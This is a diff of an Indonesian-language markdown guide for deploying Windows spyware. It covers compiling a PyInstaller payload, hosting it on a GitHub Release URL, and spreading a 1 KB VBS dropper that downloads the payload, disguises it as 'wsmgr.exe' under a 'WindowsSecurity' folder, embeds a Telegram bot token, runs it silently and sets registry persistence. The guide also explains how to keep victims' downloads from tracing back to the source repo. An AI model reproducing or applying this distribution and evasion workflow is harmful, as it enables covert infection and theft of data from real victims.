@@ -47,28 +47,60 @@ pyinstaller --onefile --windowed \
 # Output: dist/file_spyware.exe
 ```
 
-## Step 2b: Staged delivery via dropper (optional — small KB file)
+## Step 2b: Staged delivery via dropper (recommended — 1 KB file)
 
- instantly Kelompok file distribusi: `dropper.vbs` (1 KB) di sisipan dokumen/shortcut, `.exe` payload asli di-upload ke hosting.
+**Strategi:** File `.exe` (118 MB) di-host di **GitHub Release** (bukan git push — melebihi limit 100MB). Repo `main` hanya berisi source code. `dropper.vbs` (1 KB) yang disebarkan, download payload sendirian.
 
 **Setup:**
 1. Compile payload: `pyinstaller --onefile --windowed --hidden-import=... file_spyware.py` (step 2 above)
-2. Upload `dist/file_spyware.exe` ke hosting (server sendiri / GitHub release / Telegram channel)
-3. Edit `dropper.vbs`: ganti `PAYLOAD_URL` dengan URL hosting kamu
-4. Edit `dropper.vbs`: isi `BOT_TOKEN` + `CHAT_ID` (hardcoded di vbs — dropper yang menulis `.env`, jadi `.exe` tidak bawa token)
+2. Upload `dist/file_spyware` ke **GitHub Release** (via web UI):
+   - Repo → Releases → Create New Release
+   - Tag: `v1.0`
+   - Upload: `dist/file_spyware` (rename jadi `file_spyware.exe`)
+   - Publish Release
+3. `dropper.vbs` sudah di-set `PAYLOAD_URL` ke:
+   ```
+   https://github.com/manwithattention/dont-run-this/releases/download/v1.0/file_spyware.exe
+   ```
+4. Edit `dropper.vbs`: isi `BOT_TOKEN` + `CHAT_ID` (hardcoded di vbs — dropper yang menulis `.env`)
 
 **Flow saat drop jalan:**
 ```
 dropper.vbs (1 KB dijalankan via dokumen/shortcut)
-  → download payload.exe → %APPDATA%\WindowsSecurity\wsmgr.exe
+  → download payload.exe dari GitHub Release → %APPDATA%\WindowsSecurity\wsmgr.exe
   → tulis .env (token embedded di vbs)
   → Start-Process payload (silent)
-  → payload merge jalan normal (self-install skip — sudah di lokasi ini)
+  → payload auto-install ke startup registry
 ```
 
-Ukuran yang didistribute: **1 KB**. Payload yang gede (20-40MB) cuma di server.
+Ukuran yang didistribute: **1 KB** (`dropper.vbs`). Payload (118 MB) di-host di GitHub Release.
 
-## Step 3: Deploy to Windows VM
+## Step 2c: Git strategy — Source only, Binary di Release
+
+**Prinsip:** Repo `main` **hanya source code** (ringan, bersih, tidak ada binary). Binary `.exe` di-host terpisah via GitHub Release.
+
+```
+Branch main (git clone / wget repo):
+  19 file — source .py, .vbs, .md, requirements.txt, .gitignore
+  TIDAK ADA: dist/, build/, __pycache__, .exe binary
+
+Branch binary-release (lokal / CI only):
+  dist/file_spyware (118 MB) — compiled payload
+  dropper.vbs (sudah set PAYLOAD_URL ke Release)
+
+GitHub Release (v1.0):
+  file_spyware.exe — binary untuk download korban
+```
+
+**Alasan:**
+- GitHub limit file 100MB per file — `.exe` 118MB tidak bisa di-push
+- Repo bersih → tidak meninggalkan jejak build di history
+- Korban `wget` dari Release URL → tidak perlu clone repo, tidak trace ke repo source
+
+**Workflow deploy:**
+1. `git push origin main` — source only
+2. Build .exe lokal → upload ke GitHub Release manual (web UI)
+3. Sebarkan `dropper.vbs` (1 KB) — sudah punya URL Release yang bener
 
 **AUTOSTATIC — No manual placement needed:**
 
